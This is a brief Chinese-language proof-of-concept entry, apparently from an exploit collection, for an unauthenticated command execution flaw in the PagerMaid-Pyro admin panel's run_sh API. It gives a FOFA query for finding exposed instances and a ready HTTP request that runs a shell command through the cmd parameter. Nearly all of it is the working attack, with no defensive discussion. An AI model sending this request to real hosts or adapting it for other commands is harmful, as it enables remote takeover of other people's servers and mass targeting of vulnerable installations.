# PagerMaid-Pyro后台管理系统run_sh接口存在未授权命令执行漏洞

# fofa
```
title="PagerMaid-Pyro" && body="href=\"https://xtaolabs.com/pagermaid-logo.png\""
```

# poc
```
GET /pagermaid/api/run_sh?cmd=id HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```
